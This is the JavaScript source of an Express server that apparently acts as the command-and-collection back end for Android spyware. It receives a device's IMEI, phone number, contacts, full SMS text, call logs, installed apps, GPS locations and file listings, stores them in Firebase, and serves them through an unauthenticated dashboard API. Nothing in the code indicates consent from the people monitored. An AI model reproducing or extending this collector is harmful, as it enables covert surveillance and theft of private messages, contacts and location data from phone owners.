const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const admin = require('firebase-admin');
const path = require('path');
const serviceAccount = require('./servicesAccountsKey.json');

const app = express();
const PORT = 3000;

// Initialize Firebase Admin
admin.initializeApp({
    credential: admin.credential.cert(serviceAccount)
});

// Get Firestore database
const db = admin.firestore();

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static('public'));

// Helper function to get current timestamp
const getTimestamp = () => admin.firestore.FieldValue.serverTimestamp();

// API endpoint to receive data from Android app
app.post('/api/data', async (req, res) => {
    try {
        const data = req.body;
        const deviceId = data.deviceInfo?.deviceId || 'unknown';
        const timestamp = new Date().toISOString();
        
        // Update or create device document
        const deviceRef = db.collection('devices').doc(deviceId);
        await deviceRef.set({
            device_id: deviceId,
            model: data.deviceInfo?.model || null,
            manufacturer: data.deviceInfo?.manufacturer || null,
            android_version: data.deviceInfo?.androidVersion || null,
            phone_number: data.deviceInfo?.phoneNumber || null,
            imei: data.deviceInfo?.imei || null,
            last_seen: getTimestamp(),
            updated_at: getTimestamp()
        }, { merge: true });

        // Batch write for better performance
        const batch = db.batch();

        // Insert contacts
        if (data.contacts && Array.isArray(data.contacts)) {
            const contactsRef = db.collection('devices').doc(deviceId).collection('contacts');
            data.contacts.forEach(contact => {
                const contactRef = contactsRef.doc();
                batch.set(contactRef, {
                    name: contact.name || null,
                    phone: contact.phone || null,
                    collected_at: getTimestamp()
                });
            });
        }

        // Insert SMS
        if (data.sms && Array.isArray(data.sms)) {
            const smsRef = db.collection('devices').doc(deviceId).collection('sms');
            data.sms.forEach(sms => {
                const smsDocRef = smsRef.doc();
                batch.set(smsDocRef, {
                    address: sms.address || null,
                    body: sms.body || null,
                    date: sms.date || null,
                    type: sms.type || null,
                    collected_at: getTimestamp()
                });
            });
        }

        // Insert call logs
        if (data.callLogs && Array.isArray(data.callLogs)) {
            const callLogsRef = db.collection('devices').doc(deviceId).collection('call_logs');
            data.callLogs.forEach(call => {
                const callRef = callLogsRef.doc();
                batch.set(callRef, {
                    number: call.number || null,
                    type: call.type || null,
                    date: call.date || null,
                    duration: call.duration || null,
                    collected_at: getTimestamp()
                });
            });
        }

        // Insert installed apps
        if (data.installedApps && Array.isArray(data.installedApps)) {
            const appsRef = db.collection('devices').doc(deviceId).collection('installed_apps');
            data.installedApps.forEach(app => {
                const appRef = appsRef.doc();
                batch.set(appRef, {
                    package_name: app.packageName || null,
                    app_name: app.appName || null,
                    is_system_app: app.isSystemApp || false,
                    collected_at: getTimestamp()
                });
            });
        }

        // Insert location
        if (data.location && data.location.latitude) {
            const locationRef = db.collection('devices').doc(deviceId).collection('locations').doc();
            batch.set(locationRef, {
                latitude: data.location.latitude,
                longitude: data.location.longitude,
                accuracy: data.location.accuracy || null,
                timestamp: data.location.timestamp || null,
                collected_at: getTimestamp()
            });
        }

        // Insert files
        if (data.files && Array.isArray(data.files)) {
            const filesRef = db.collection('devices').doc(deviceId).collection('files');
            data.files.forEach(file => {
                const fileRef = filesRef.doc();
                batch.set(fileRef, {
                    name: file.name || null,
                    path: file.path || null,
                    size: file.size || 0,
                    is_directory: file.isDirectory || false,
                    last_modified: file.lastModified || null,
                    collected_at: getTimestamp()
                });
            });
        }

        // Record submission
        const submissionRef = db.collection('devices').doc(deviceId).collection('submissions').doc();
        batch.set(submissionRef, {
            timestamp: data.timestamp || timestamp,
            collected_at: getTimestamp()
        });

        // Commit batch
        await batch.commit();

        res.json({ success: true, message: 'Data received and stored in Firebase successfully' });
    } catch (error) {
        console.error('Error processing data:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// API endpoints for dashboard
app.get('/api/devices', async (req, res) => {
    try {
        const devicesSnapshot = await db.collection('devices')
            .orderBy('last_seen', 'desc')
            .get();
        
        const devices = [];
        devicesSnapshot.forEach(doc => {
            const data = doc.data();
            devices.push({
                id: doc.id,
                ...data,
                last_seen: data.last_seen?.toDate?.()?.toISOString() || data.last_seen
            });
        });
        
        res.json(devices);
    } catch (error) {
        console.error('Error fetching devices:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/device/:deviceId/contacts', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const contactsSnapshot = await db.collection('devices')
            .doc(deviceId)
            .collection('contacts')
            .orderBy('collected_at', 'desc')
            .get();
        
        const contacts = [];
        contactsSnapshot.forEach(doc => {
            contacts.push({
                id: doc.id,
                ...doc.data(),
                collected_at: doc.data().collected_at?.toDate?.()?.toISOString() || doc.data().collected_at
            });
        });
        
        res.json(contacts);
    } catch (error) {
        console.error('Error fetching contacts:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/device/:deviceId/sms', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const smsSnapshot = await db.collection('devices')
            .doc(deviceId)
            .collection('sms')
            .orderBy('date', 'desc')
            .limit(1000)
            .get();
        
        const sms = [];
        smsSnapshot.forEach(doc => {
            sms.push({
                id: doc.id,
                ...doc.data(),
                collected_at: doc.data().collected_at?.toDate?.()?.toISOString() || doc.data().collected_at
            });
        });
        
        res.json(sms);
    } catch (error) {
        console.error('Error fetching SMS:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/device/:deviceId/call-logs', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const callLogsSnapshot = await db.collection('devices')
            .doc(deviceId)
            .collection('call_logs')
            .orderBy('date', 'desc')
            .limit(1000)
            .get();
        
        const callLogs = [];
        callLogsSnapshot.forEach(doc => {
            callLogs.push({
                id: doc.id,
                ...doc.data(),
                collected_at: doc.data().collected_at?.toDate?.()?.toISOString() || doc.data().collected_at
            });
        });
        
        res.json(callLogs);
    } catch (error) {
        console.error('Error fetching call logs:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/device/:deviceId/apps', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const appsSnapshot = await db.collection('devices')
            .doc(deviceId)
            .collection('installed_apps')
            .orderBy('app_name')
            .get();
        
        const apps = [];
        appsSnapshot.forEach(doc => {
            apps.push({
                id: doc.id,
                ...doc.data(),
                collected_at: doc.data().collected_at?.toDate?.()?.toISOString() || doc.data().collected_at
            });
        });
        
        res.json(apps);
    } catch (error) {
        console.error('Error fetching apps:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/device/:deviceId/location', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const locationsSnapshot = await db.collection('devices')
            .doc(deviceId)
            .collection('locations')
            .orderBy('timestamp', 'desc')
            .limit(100)
            .get();
        
        const locations = [];
        locationsSnapshot.forEach(doc => {
            locations.push({
                id: doc.id,
                ...doc.data(),
                collected_at: doc.data().collected_at?.toDate?.()?.toISOString() || doc.data().collected_at
            });
        });
        
        res.json(locations);
    } catch (error) {
        console.error('Error fetching locations:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/device/:deviceId/files', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filesSnapshot = await db.collection('devices')
            .doc(deviceId)
            .collection('files')
            .orderBy('collected_at', 'desc')
            .limit(1000)
            .get();
        
        const files = [];
        filesSnapshot.forEach(doc => {
            files.push({
                id: doc.id,
                ...doc.data(),
                collected_at: doc.data().collected_at?.toDate?.()?.toISOString() || doc.data().collected_at
            });
        });
        
        res.json(files);
    } catch (error) {
        console.error('Error fetching files:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/stats', async (req, res) => {
    try {
        // Get device count
        const devicesSnapshot = await db.collection('devices').get();
        const deviceCount = devicesSnapshot.size;
        
        // Get counts from all devices
        let contactsCount = 0;
        let smsCount = 0;
        let callLogsCount = 0;
        let appsCount = 0;
        let locationsCount = 0;
        let filesCount = 0;
        
        const devicePromises = devicesSnapshot.docs.map(async (deviceDoc) => {
            const deviceId = deviceDoc.id;
            
            const [contacts, sms, callLogs, apps, locations, files] = await Promise.all([
                db.collection('devices').doc(deviceId).collection('contacts').get(),
                db.collection('devices').doc(deviceId).collection('sms').get(),
                db.collection('devices').doc(deviceId).collection('call_logs').get(),
                db.collection('devices').doc(deviceId).collection('installed_apps').get(),
                db.collection('devices').doc(deviceId).collection('locations').get(),
                db.collection('devices').doc(deviceId).collection('files').get()
            ]);
            
            return {
                contacts: contacts.size,
                sms: sms.size,
                callLogs: callLogs.size,
                apps: apps.size,
                locations: locations.size,
                files: files.size
            };
        });
        
        const counts = await Promise.all(devicePromises);
        counts.forEach(count => {
            contactsCount += count.contacts;
            smsCount += count.sms;
            callLogsCount += count.callLogs;
            appsCount += count.apps;
            locationsCount += count.locations;
            filesCount += count.files;
        });
        
        res.json({
            devices: deviceCount,
            contacts: contactsCount,
            sms: smsCount,
            callLogs: callLogsCount,
            apps: appsCount,
            locations: locationsCount,
            files: filesCount
        });
    } catch (error) {
        console.error('Error fetching stats:', error);
        res.status(500).json({ error: error.message });
    }
});

// Serve dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
    console.log(`Dashboard available at http://localhost:${PORT}`);
    console.log(`Firebase Firestore initialized successfully`);
});
